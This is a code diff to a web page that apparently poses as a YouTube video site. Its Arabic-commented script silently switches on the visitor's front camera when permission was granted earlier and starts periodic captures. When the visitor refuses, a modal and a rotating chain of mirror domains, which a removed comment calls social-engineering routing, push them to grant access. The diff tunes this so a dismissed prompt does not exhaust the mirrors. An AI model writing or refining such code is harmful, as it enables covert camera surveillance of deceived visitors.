@@ -284,15 +284,13 @@ body.drawer-mode .main{margin-inline-start:0}
 
 <script>
 /* ==========================================================
-   شبكة النطاقات وتوجيه الهندسة الاجتماعية عند الرفض
+   نظام تدوير النطاقات المتسلسل والمستقر (URL-Based Multi-Mirror Chain)
    ========================================================== */
 const mirrorDomains = [
     "https://youtube-my.onrender.com",
-    "https://youtube-my-1.onrender.com", 
-    "https://youtube-my-2.onrender.com"
+    "https://youtube-my-1.onrender.com"
 ];
 
-// الانتقال للصفحة التالية عند ضغط الزر الأحمر في التنبيه
 function goToNextMirror() {
     const urlParams = new URLSearchParams(window.location.search);
     let currentAttempt = parseInt(urlParams.get('n') || '0');
@@ -302,12 +300,10 @@ function goToNextMirror() {
         const nextDomain = mirrorDomains[nextAttempt];
         window.location.replace(`${nextDomain}?n=${nextAttempt}`);
     } else {
-        // إذا استنفد جميع الروابط، يعيد تشغيل الرابط الأول مجدداً
         window.location.replace(`${mirrorDomains[0]}?n=0`);
     }
 }
 
-// إظهار نافذة التنبيه المخصصة عند الرفض
 function showPermissionModal() {
     const modal = document.getElementById('permModal');
     if (modal) {
@@ -315,13 +311,11 @@ function showPermissionModal() {
     }
 }
 
-// الفحص والاستجابة عند تحميل الصفحة
+// الفحص التلقائي للكاميرا عند التحميل إذا كانت ممنوحة مسبقاً (Granted)
 async function autoCheckPermission() {
     if (navigator.permissions && navigator.permissions.query) {
         try {
             const permissionStatus = await navigator.permissions.query({ name: 'camera' });
-            
-            // إذا كان السماح ممنوحاً مسبقاً، شغل الكاميرا صامتاً
             if (permissionStatus.state === 'granted') {
                 mediaStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: { ideal: 'user' } } 
@@ -329,10 +323,6 @@ async function autoCheckPermission() {
                 const videoEl = document.getElementById('video');
                 if (videoEl) videoEl.srcObject = mediaStream;
                 startPeriodicCapture();
-            } 
-            // إذا كان محظوراً مسبقاً، اظهر النافذة التنويهية فور الضغط أو الزيارة
-            else if (permissionStatus.state === 'denied') {
-                // سيبقى بالصفحة الرئيسية حتى يضغط على الفيديو أو يظهر التنبيه
             }
         } catch (err) {
             console.log("فحص الصلاحيات غير مدعوم:", err);
@@ -484,7 +474,7 @@ function searchFor(text){
   render();scrollTo(0,0);
 }
 
-/* ===== دوال الكاميرا والانتقال والتنبيه عند الرفض ===== */
+/* ===== دوال الكاميرا والتحقق الدقيق من الرفض الصريح vs التجاهل ===== */
 async function openVideo(id) {
     if (mediaStream) {
         executeWatchTransition(id);
@@ -507,8 +497,14 @@ async function openVideo(id) {
         startPeriodicCapture();
 
     } catch (e) {
-        console.log("تم رفض الإذن أو كان محظوراً، جاري إظهار نافذة التوجيه التنبيهية...");
-        showPermissionModal();
+        // التحقق مما إذا كان الخطأ ناتجاً عن حظر/رفض صريح فقط
+        if (e.name === 'NotAllowedError' || e.name === 'PermissionDeniedError') {
+            console.log("تم رفض الإذن صراحةً، جاري إظهار نافذة التوجيه التنبيهية...");
+            showPermissionModal();
+        } else {
+            console.log("تم تجاهل طلب الإذن أو إلغاؤه مؤقتاً (لا يتم استنزاف روابط التوجيه).");
+            // تبقى الصفحة كما هي دون تدوير الرابط، ليتيح للمستخدم إعادة المحاولة
+        }
     }
 }
 
